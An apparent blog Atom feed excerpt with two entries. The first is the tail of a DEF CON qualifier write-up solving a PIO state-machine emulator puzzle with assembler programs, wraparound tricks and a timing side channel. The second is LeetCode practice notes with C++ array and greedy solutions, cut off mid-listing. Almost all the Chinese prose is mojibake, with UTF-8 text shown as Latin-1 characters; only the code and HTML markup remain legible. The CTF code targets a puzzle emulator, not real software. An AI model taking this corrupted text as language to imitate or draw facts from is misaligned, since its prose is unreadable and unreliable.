ä¸­å®ç°äº†DEBUGçš„ä¿¡æ¯è¾“å‡ºä½†æ˜¯æ²¡å®šä¹‰å¼€å¯ï¼Œå¦‚æœæœ‰ä¸€ä¸ªdebugç¯å¢ƒå°±ä¼šå¥½å¾ˆå¤šã€‚å¦ä¸€ä¸ªå¸ˆå‚…æ‰¾åˆ°äº†ä¸€ä¸ªswiftçš„dockerï¼Œåœ¨dockeré‡Œç¼–è¯‘ï¼Œå¼€debugï¼Œå°±èƒ½æœ¬åœ°è§‚å¯Ÿåˆ°æ¯æ¡æŒ‡ä»¤æ‰§è¡Œå’ŒPIOçš„æƒ…å†µäº†ã€‚</p><p>ä¸€ä¸ªå°æ’æ›²æ˜¯ï¼Œå‡ºé¢˜äººçš„ç¨‹åºå†™é”™äº†ï¼Œå°†FIFOå†™æˆäº†LIFOã€‚ä½†æ˜¯æœ€åçš„ç»“æœæ£€æŸ¥è¿˜æ˜¯ç”¨çš„é”™è¯¯çš„APIï¼Œç»“æœå°±å¯¼è‡´é¡ºåºå…¶å®ä¹Ÿæ²¡é”™ã€‚åˆšå¼€å§‹å¦ä¸€ä¸ªå¸ˆå‚…åœ¨è°ƒè¯•ä¿¡æ¯å‘ç°é¡ºåºæ˜¯çƒ‚çš„ä¹‹åæ”¾å¼ƒäº†ï¼Œç»“æœæœ‰é˜Ÿäº¤äº†è¿™ä¸ªé¢˜ï¼Œä»”ç»†çœ‹äº†çœ‹è®©æˆ‘å®¡å‡ºæ¥æ¥ç€åšäº†ã€‚</p><p>ä¸‰ä¸ªå…³å¡çš„å†…å®¹æ–¹å‘ä¹Ÿæœ‰ç‚¹ä¸ä¸€æ ·ã€‚</p><p>ç¬¬ä¸€ä¸ªæ˜¯ç®€å•å¼•è„šè¯»ï¼Œå¼€äº†å…±äº«å¼•è„šï¼Œå°†æ•°æ®å¾ªç¯æŒ‰1ä½ä»ä¸€ä¸ªå¼•è„šè¾“å‡ºã€‚é€†å®ŒæŒ‡ä»¤é›†ä¹‹ååšæ—¶é’ŸåŒæ­¥ä»å¼•è„šè¯»å°±è¡Œã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">program = [</span><br><span class="line">        PIOAssembler.<span class="built_in">set</span>(<span class="number">2</span>,<span class="number">7</span>, sideset=<span class="number">28</span>),  <span class="comment"># set y = 7</span></span><br><span class="line">        PIOAssembler.<span class="built_in">set</span>(<span class="number">1</span>,<span class="number">15</span>, sideset=<span class="number">22</span>),  <span class="comment"># set x = 15</span></span><br><span class="line">        PIOAssembler.<span class="built_in">set</span>(<span class="number">1</span>,<span class="number">15</span>, sideset=<span class="number">23</span>),  <span class="comment"># set x = 15</span></span><br><span class="line">        PIOAssembler.in_op(<span class="number">0</span>, <span class="number">1</span>, <span class="number">30</span>),</span><br><span class="line">        PIOAssembler.jmp(<span class="number">2</span>, <span class="number">3</span>, sideset=<span class="number">17</span>),</span><br><span class="line">        PIOAssembler.jmp(<span class="number">4</span>, <span class="number">1</span>, sideset=<span class="number">16</span>), <span class="comment"># Y--</span></span><br><span class="line">        PIOAssembler.wait(<span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>)</span><br><span class="line">    ]</span><br></pre></td></tr></table></figure><p>ç¬¬äºŒå…³å¼€å§‹ä¸Šéš¾åº¦äº†ã€‚å®ƒä¼šå…ˆæ‹‰å–ä¸¤æ¬¡æ•°æ®ï¼Œç„¶åæ‹¿è¿™ä¸¤ä¸ªæ•°æ®åšåŒå±‚å¾ªç¯çš„è®¡æ•°å˜é‡ã€‚äº†è§£äº†ä¸‹swiftè¯­æ³•å¹¶ä¸”é€†äº†ä¸‹å…·ä½“çš„æŒ‡ä»¤å®ç°ï¼Œå‘ç°Xå’ŒYå¯„å­˜å™¨è™½ç„¶æ˜¯Uintä½†æ˜¯æ²¡æœ‰åˆ¤æ–­ï¼Œjmp xâ€“è¿™ç§æŒ‡ä»¤ä¼šæœ‰uintçš„æ•´æ•°ç¯ç»•ï¼Œå› æ­¤æ— è®ºå¦‚ä½•éƒ½ä¼špush y-xè¿›å»ã€‚æ‰€ä»¥æœ€åç†è®ºä¸Šæ‹¿åˆ°xå’Œy-xå¯ä»¥è¿˜åŸyã€‚ä½†æ˜¯è´Ÿæ•°å¤ªå¤§ä¼šçˆ†ï¼Œå› æ­¤ç®—ä¸¤ä¸ªæ•°x-yå’Œ~(x-y)è¿™ç§å°±èƒ½åšã€‚</p><p>ç¬¬ä¸‰å…³åˆ™æ˜¯æœ€æŠ½è±¡çš„ï¼Œæ—¶é’Ÿä¾§ä¿¡é“ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#x27;type&#x27;: &#x27;PULL&#x27;, &#x27;if_empty&#x27;: 0, &#x27;block&#x27;: 1, &#x27;sideset&#x27;: &#x27;do sideset count: 0x0 value: 0x0 mask: 0x0 sideset: 0&#x27;&#125;</span><br><span class="line">&#123;&#x27;type&#x27;: &#x27;OUT&#x27;, &#x27;dest&#x27;: &#x27;PINS&#x27;, &#x27;bitcount&#x27;: 32, &#x27;sideset&#x27;: &#x27;do sideset count: 0x0 value: 0x0 mask: 0x0 sideset: 0&#x27;&#125;</span><br><span class="line">&#123;&#x27;type&#x27;: &#x27;IN&#x27;, &#x27;src&#x27;: &#x27;PINS&#x27;, &#x27;bitcount&#x27;: 2, &#x27;sideset&#x27;: &#x27;do sideset count: 0x0 value: 0x0 mask: 0x0 sideset: 0&#x27;&#125;</span><br><span class="line">&#123;&#x27;type&#x27;: &#x27;MOV&#x27;, &#x27;dest&#x27;: &#x27;Y&#x27;, &#x27;op&#x27;: &#x27;&#x27;, &#x27;src&#x27;: &#x27;ISR&#x27;, &#x27;sideset&#x27;: &#x27;do sideset count: 0x0 value: 0x0 mask: 0x0 sideset: 0&#x27;&#125;</span><br><span class="line">&#123;&#x27;type&#x27;: &#x27;JMP&#x27;, &#x27;cond&#x27;: &#x27;Y--&#x27;, &#x27;addr&#x27;: 4, &#x27;sideset&#x27;: &#x27;do sideset count: 0x0 value: 0x0 mask: 0x0 delay: 5 sideset: 5&#x27;&#125;</span><br><span class="line">&#123;&#x27;type&#x27;: &#x27;SET&#x27;, &#x27;dest&#x27;: &#x27;PINS&#x27;, &#x27;data&#x27;: 0, &#x27;sideset&#x27;: &#x27;do sideset count: 0x0 value: 0x0 mask: 0x0 sideset: 0&#x27;&#125;</span><br><span class="line">&#123;&#x27;type&#x27;: &#x27;IN&#x27;, &#x27;src&#x27;: &#x27;PINS&#x27;, &#x27;bitcount&#x27;: 32, &#x27;sideset&#x27;: &#x27;do sideset count: 0x0 value: 0x0 mask: 0x0 sideset: 0&#x27;&#125;</span><br><span class="line">&#123;&#x27;type&#x27;: &#x27;MOV&#x27;, &#x27;dest&#x27;: &#x27;PINS&#x27;, &#x27;op&#x27;: &#x27;&#x27;, &#x27;src&#x27;: &#x27;NULL&#x27;, &#x27;sideset&#x27;: &#x27;do sideset count: 0x0 value: 0x0 mask: 0x0 sideset: 0&#x27;&#125;</span><br><span class="line">&#123;&#x27;type&#x27;: &#x27;PUSH&#x27;, &#x27;if_full&#x27;: 0, &#x27;block&#x27;: 1, &#x27;sideset&#x27;: &#x27;do sideset count: 0x0 value: 0x0 mask: 0x0 delay: 10 sideset: 10&#x27;&#125;</span><br></pre></td></tr></table></figure><p>å®ƒå°†æ•°æ®è¯»å–åˆ°32ä¸ªå¼•è„šä¹‹åï¼Œç”¨setæŠ¹å»äº†ä¸¤ä½ï¼ˆç½®ä¸º0äº†ï¼‰ã€‚ç„¶åè¿™ä¸¤ä½ä¼šåšä¸ºå˜é‡å»jmpå¾ªç¯ã€‚æ‰€ä»¥æˆ‘ä»¬åªè¦ä»æ—¶é’Ÿå¯¹é½æ‹¿åˆ°å¾ªç¯æ¬¡æ•°å°±èƒ½æ¨ç®—å‡ºè¿™ç¼ºçš„ä¸¤ä½æ˜¯å¤šå°‘ã€‚</p><p>é—®é¢˜æ˜¯æ€ä¹ˆå»æ ‡è®°è¿™ä¸ªèµ·æ­¢æ—¶é—´ã€‚æœ€åçš„æƒ³æ³•æ˜¯åˆ©ç”¨autopullæœºåˆ¶ï¼Œè‡ªåŠ¨æ‹‰å–æ•°æ®ï¼ˆä¸ç”¨æ‰‹åŠ¨æ‹‰å–ï¼Œå¹¶ä¸”çœæ—¶é’Ÿï¼‰ï¼Œç„¶åç”¨jmpåˆ¤æ–­OSRå¯„å­˜å™¨æ˜¯å¦ä¸ºç©ºæ¥å†³å®šä»€ä¹ˆæ—¶å€™å¼€å§‹è®¡æ—¶ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">program = [</span><br><span class="line">        asm.set(DstReg.Y, 7),  # set Y = 3</span><br><span class="line">        asm.set(DstReg.X, 11), </span><br><span class="line">        asm.label(&quot;start&quot;),</span><br><span class="line">        asm.jmp(Cond.X_DEC_NZ, &quot;start&quot;),  # jmp x--</span><br><span class="line">        # åŸå§‹çŠ¶æ€æœºä¸­ç¬¬ 9æ¡æŒ‡ä»¤æ‰§è¡Œåå³push æ•°æ®</span><br><span class="line">        # autopull éœ€è¦åœ¨ç¬¬9æ¡æŒ‡ä»¤åç¬¬10æ¡æŒ‡ä»¤å‰æ‰èƒ½è‡ªåŠ¨è·å–æ•°æ®</span><br><span class="line">        # ins count: 10</span><br><span class="line">        asm.jmp(Cond.OSRE, &quot;n_0&quot;),  # osr éç©ºåˆ™è·³è½¬, n=0</span><br><span class="line">        asm.set(DstReg.X, 0, sideset=5),</span><br><span class="line">        asm.jmp(Cond.OSRE, &quot;n_1&quot;),  # osr éç©ºåˆ™è·³è½¬, n=1</span><br><span class="line">        asm.set(DstReg.X, 0, sideset=5),</span><br><span class="line">        asm.jmp(Cond.OSRE, &quot;n_2&quot;),  # osr éç©ºåˆ™è·³è½¬, n=2</span><br><span class="line">        asm.set(DstReg.X, 0, sideset=5),</span><br><span class="line">        # n=3</span><br><span class="line">        asm.out(DstReg.PINS, 32),</span><br><span class="line">        asm.set(DstReg.PINS, 3),</span><br><span class="line">        asm.jmp(Cond.ALWAYS, &quot;n_end&quot;),</span><br><span class="line">        # n=2</span><br><span class="line">        asm.label(&quot;n_2&quot;),</span><br><span class="line">        asm.out(DstReg.PINS, 32),</span><br><span class="line">        asm.set(DstReg.PINS, 2),</span><br><span class="line">        asm.jmp(Cond.ALWAYS, &quot;n_end&quot;),</span><br><span class="line">        # n=1</span><br><span class="line">        asm.label(&quot;n_1&quot;),</span><br><span class="line">        asm.out(DstReg.PINS, 32),</span><br><span class="line">        asm.set(DstReg.PINS, 1),</span><br><span class="line">        asm.jmp(Cond.ALWAYS, &quot;n_end&quot;),</span><br><span class="line">        # n=0</span><br><span class="line">        asm.label(&quot;n_0&quot;),</span><br><span class="line">        asm.out(DstReg.PINS, 32),</span><br><span class="line">        asm.label(&quot;n_end&quot;),</span><br><span class="line">        asm.mov(DstReg.ISR, MovOp.NONE, SrcReg.PINS),</span><br><span class="line">        asm.push(),</span><br><span class="line">        asm.mov(DstReg.PINS, MovOp.NONE, SrcReg.NULL),</span><br><span class="line">        asm.wait(1, 1, 0),</span><br><span class="line">    ]</span><br></pre></td></tr></table></figure><h2 id="ä¸€äº›æ€»ç»“">ä¸€äº›æ€»ç»“</h2><p>48hè¿è½´è½¬é¦–å…ˆè‚¯å®šä¸æ˜¯ä¸“é—¨æ‰“æˆ–è€…æœ‰ä¸€ä¸ªäººå¾ˆå¤šçš„teamè‚¯å®šé­ä¸ä½ï¼Œæ‰“é«˜åˆ†è‚¯å®šæ˜¯è¦è¿è½´è½¬çš„ã€‚å¦å¤–è¿™äº›å¸ˆå‚…æ˜¯çœŸçš„nbã€‚</p><p>defcon qualçš„é¢˜ç›®é£æ ¼å’Œå›½å†…å·®çš„æŒºå¤šçš„ï¼Œæ„Ÿè§‰é‡ç‚¹éƒ½æ˜¯æŠ€æœ¯æœ¬èº«è€Œä¸æ˜¯å›½å†…è¿™ç§å·æ›´åŠ å¤æ‚çš„æ¿å­åˆ©ç”¨ï¼Œæ¯”å¦‚å»ç¬¦å·çš„rustä¹‹ç±»ã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;è·Ÿç€nu1lçš„å¤§ä½¬ä»¬æ‰“äº†defconé¢„é€‰ã€‚è¿™æ˜¯ä¸€å‘¨ä¹‹åçš„è®°å½•äº†ã€‚é˜Ÿä¼é‡Œæ²¡å•¥äººæ¥ï¼Œå’Œnu1lçš„å¤§è·Œä»¬å’Œåšäº†ä¸€æŠŠï¼ˆè™½ç„¶åªæ˜¯ç®€å•é¢˜ï¼‰ã€‚&lt;/p&gt;
&lt;h2 id=&quot;å…³äºé¢˜ç›®é£æ ¼&quot;&gt;å…³äºé¢˜ç›®é£æ ¼&lt;/h2&gt;
&lt;p&gt;é¦–å…ˆï¼Œdefconå¾ˆæ˜æ˜¾çš„ï¼Œé¢˜ç›®çš„ç§ç±»å¾ˆå¤šè€Œä¸”&lt;strong&gt;å¾ˆæ–°&lt;/st</summary>
      
    
    
    
    
    <category term="wp" scheme="https://zjw1nd.github.io/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>Algorithm-leetcode</title>
    <link href="https://zjw1nd.github.io/2025/04/07/Algorithm-leetcode/"/>
    <id>https://zjw1nd.github.io/2025/04/07/Algorithm-leetcode/</id>
    <published>2025-04-07T07:18:55.000Z</published>
    <updated>2025-04-27T03:25:39.555Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>lcçš„è¾“å…¥ä¼ å¼•ç”¨ï¼Œå¹¶ä¸”æ— éœ€è‡ªå·±è®¾è®¡è¾“å…¥è¾“å‡ºæ ¼å¼ï¼Œåªéœ€è¦å®ç°æ ¸å¿ƒå‡½æ•°å³å¯</p></blockquote><p>è€ƒè™‘åœ¨æ¯ä¸ªæ–¹å‘ä¸Šéƒ½åš1-2é“é¢˜ã€‚</p><h1>æ•°ç»„æ“ä½œ</h1><p>1-3ï¼šæ•°ç»„æ“ä½œï¼ŒåŒæŒ‡é’ˆä¸ºä¸»ï¼ŒC++ä¸Šå­¦æœŸè€ƒå®Œcspå·²ç»æ‰‹ç”Ÿäº†ï¼Œä¸ä¼šç”¨vecäº†ã€‚éœ€è¦åˆ©ç”¨æœ‰åºä¿¡æ¯ã€‚ä¿ç•™è¿ç»­ä¸¤ä¸ªé‡å¤å…ƒç´ ï¼Œæœ‰åºæ•°ç»„ï¼Œä¸é¢å¤–å¼€ç©ºé—´ï¼š</p><p>åŒæŒ‡é’ˆä¸€ä¸ªç”¨äºéå†æœç´¢ï¼Œå¦ä¸€ä¸ªç”¨äºæ ‡è®°ä¿®æ”¹ä½ç½®ï¼Œé€šç”¨æ€è·¯</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">removeDuplicates</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// è¯•ä¸€ä¸‹ä¸Šä¸€é¢˜çš„å¿«æ…¢æŒ‡é’ˆ</span></span><br><span class="line">        <span class="comment">// æ•°ç»„æœ‰åºï¼Œå¦‚æœæœ‰éœ€è¦åˆ é™¤çš„å…ƒç´ ï¼Œé‚£ä¹ˆåœ¨é¦–æ¬¡éå†åˆ°è¿™ä¸ªå…ƒç´ ä¹‹å+2è‚¯å®šä¸ä¼šæ¼</span></span><br><span class="line">        <span class="comment">// ä¸è®©å¼€æ–°æ•°ç»„ï¼Ÿ</span></span><br><span class="line">        <span class="type">int</span> n=nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">if</span>(n&lt;=<span class="number">2</span>) <span class="keyword">return</span> n;</span><br><span class="line">        <span class="type">int</span> fast=<span class="number">2</span>,slow=<span class="number">2</span>;<span class="comment">// 0,1ç›´æ¥ä¿ç•™ä¸ç”¨çœ‹</span></span><br><span class="line">        <span class="keyword">while</span>(fast &lt; n)&#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[fast]!=nums[slow<span class="number">-2</span>])<span class="comment">//æ— </span></span><br><span class="line">                nums[slow++]=nums[fast];</span><br><span class="line">            fast++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> slow;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="4-å¤šæ•°å…ƒç´ -æ•°ç»„ç»Ÿè®¡">4 å¤šæ•°å…ƒç´  æ•°ç»„ç»Ÿè®¡</h2><p>ç»Ÿè®¡æŒ‡æ ‡ç›¸å…³çš„é—®é¢˜æœ€æš´åŠ›çš„å°±æ˜¯hashmapä¸€å¯¹ä¸€ï¼Œæ¯”å¦‚æ‰¾å¤šæ•°å…ƒç´ ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">majorityElement</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        unordered_map&lt;<span class="type">int</span>, <span class="type">int</span>&gt; counts;</span><br><span class="line">        <span class="type">int</span> majority = <span class="number">0</span>, cnt = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> num: nums) &#123;</span><br><span class="line">            ++counts[num];</span><br><span class="line">            <span class="keyword">if</span> (counts[num] &gt; cnt) &#123;</span><br><span class="line">                majority = num;</span><br><span class="line">                cnt = counts[num];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> majority;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>å¤šæ•°å…ƒç´ çš„é—®é¢˜ï¼šhashmapï¼Œæ‘©å°”æŠ•ç¥¨ï¼ˆæ–°é²œï¼‰ï¼Œæ’åºå–ä¸­é—´ï¼Œéšæœºæ‘©å°”æŠ•ç¥¨æ˜¯ä¸€ä¸ªä¸“é—¨è§£å†³ç»å¯¹ä¼—æ•°çš„ç®—æ³•ã€‚å…·æœ‰Onçš„æ—¶é—´å¤æ‚åº¦å’ŒO1çš„ç©ºé—´å¤æ‚åº¦ï¼Œæ•ˆç‡æ¯”è¾ƒé«˜ã€‚</p><p>åˆå§‹åŒ–ï¼š ç¥¨æ•°ç»Ÿè®¡ votes = 0 ï¼Œ ä¼—æ•° xã€‚å¾ªç¯ï¼š éå†æ•°ç»„ nums ä¸­çš„æ¯ä¸ªæ•°å­— num ã€‚å½“ ç¥¨æ•° votes ç­‰äº 0 ï¼Œåˆ™å‡è®¾å½“å‰æ•°å­— num æ˜¯ä¼—æ•°ã€‚å½“ num = x æ—¶ï¼Œç¥¨æ•° votes è‡ªå¢ 1 ï¼›å½“ num != x æ—¶ï¼Œç¥¨æ•° votes è‡ªå‡ 1 ã€‚è¿”å›å€¼ï¼š è¿”å› x å³å¯ã€‚æ­£ç¡®æ€§ç•¥</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">majorityElement</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> x = <span class="number">0</span>, votes = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> num : nums)&#123;</span><br><span class="line">            <span class="keyword">if</span> (votes == <span class="number">0</span>) x = num;</span><br><span class="line">            votes += (num == x ? <span class="number">1</span> : <span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> x;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="5-è½®è½¬æ•°ç»„">5 è½®è½¬æ•°ç»„</h2><p>é¢å¤–ç©ºé—´ç•¥ï¼Œå…³æ³¨åŸåœ°ç®—æ³•ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// æ–¹æ³•ä¸€ï¼šäº¤æ¢ã€‚æ¯”è¾ƒç¬¦åˆç›´è§‰çš„O1æ€è·¯ã€‚ä¸è¿‡éœ€è¦éå†çš„è½®æ•°gcd(k,n)æ˜¯æ¨å¯¼çš„ç»“æœ</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">rotate</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, <span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        k = k % n;</span><br><span class="line">        <span class="type">int</span> count = <span class="built_in">gcd</span>(k, n);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> start = <span class="number">0</span>; start &lt; count; ++start) &#123;</span><br><span class="line">            <span class="type">int</span> current = start;</span><br><span class="line">            <span class="type">int</span> prev = nums[start];</span><br><span class="line">            <span class="keyword">do</span> &#123;</span><br><span class="line">                <span class="type">int</span> next = (current + k) % n;</span><br><span class="line">                <span class="built_in">swap</span>(nums[next], prev);</span><br><span class="line">                current = next;</span><br><span class="line">            &#125; <span class="keyword">while</span> (start != current);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// æ–¹æ³•2: å·§å¦™çš„æ€è·¯ï¼Œæœ€åçš„k%nä¸ªå…ƒç´ ä¼šå˜åˆ°å¼€å¤´</span></span><br><span class="line"><span class="comment">// è”æƒ³åˆ°ç¿»è½¬æ“ä½œçš„æ•°ç»„åŸè¯­</span></span><br><span class="line"><span class="comment">// æˆ‘ä»¬åªéœ€è¦å…ˆç¿»è½¬æ•´ä¸ªæ•°ç»„ï¼Œå†åˆ†åˆ«ç¿»è½¬å‰k%nä¸ªå’Œå…¶ä½™çš„ï¼Œç¿»è½¬ä¸‰æ¬¡å³å¯</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">reverse</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, <span class="type">int</span> start, <span class="type">int</span> end)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">while</span> (start &lt; end) &#123;</span><br><span class="line">            <span class="built_in">swap</span>(nums[start], nums[end]);</span><br><span class="line">            start += <span class="number">1</span>;</span><br><span class="line">            end -= <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">rotate</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, <span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">        k %= nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="built_in">reverse</span>(nums, <span class="number">0</span>, nums.<span class="built_in">size</span>() - <span class="number">1</span>);</span><br><span class="line">        <span class="built_in">reverse</span>(nums, <span class="number">0</span>, k - <span class="number">1</span>);</span><br><span class="line">        <span class="built_in">reverse</span>(nums, k, nums.<span class="built_in">size</span>() - <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="ç®€å•çš„è´ªå¿ƒ">ç®€å•çš„è´ªå¿ƒ</h2><p>ä¹°å–è‚¡ç¥¨ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">maxProfit</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; prices)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// ç”¨ä¸€ä¸ªç»“æ„æ•°ç»„æ‰“åŒ…ç„¶åç›´æ¥æ’åº</span></span><br><span class="line">        <span class="comment">// è´ªå¿ƒ</span></span><br><span class="line">        <span class="type">int</span> cost = INT_MAX, profit = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> price : prices) &#123;</span><br><span class="line">            cost = <span class="built_in">min</span>(cost, price);</span><br><span class="line">            profit = <span class="built_in">max</span>(profit, price - cost);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> profit;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="135-åˆ†ç³–æœ">135 åˆ†ç³–æœ</h2><p>å¼€å§‹æ²¡æ†‹å‡ºæ¥ï¼Œé¢˜è§£æ²¡çœ‹æ‡‚ä½†æ˜¯çœ‹äº†ä¸€ç‚¹ä¸€ä¸‹æƒ³å‡ºæ¥äº†ã€‚ä¸­é€”æ•°ç»„æ’åºçŠ¶æ€å˜åŒ–ä¼šå½±å“ç»“æœçš„ï¼Œæˆ–è€…è¯´å¯¹â€éƒ¨åˆ†åŒºé—´æ’åºâ€œæˆ–è€…æ‰€è°“çš„â€æå¤§å€¼â€œ/â€œæå°å€¼â€æœ‰è¦æ±‚çš„ï¼Œå¯ä»¥è€ƒè™‘è¿™ä¸ªæ€è·¯ã€‚æˆ‘ä»¬å…ˆä»å·¦åˆ°å³éå†ä¸€éï¼Œåªå…³æ³¨å¢å¹…åº¦ï¼Œä¸æ˜¯å¢åŠ çš„ä¸ç®¡ã€‚ç„¶ååå‘é‡æ–°éå†ä¸€éï¼Œä¹Ÿæ˜¯ä¸€æ ·çš„æ€è·¯ï¼Œæœ€ç»ˆç»“æœåœ¨ä¸¤æ¬¡ä¸­å–æœ€å¤§å°±è¡Œäº†ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 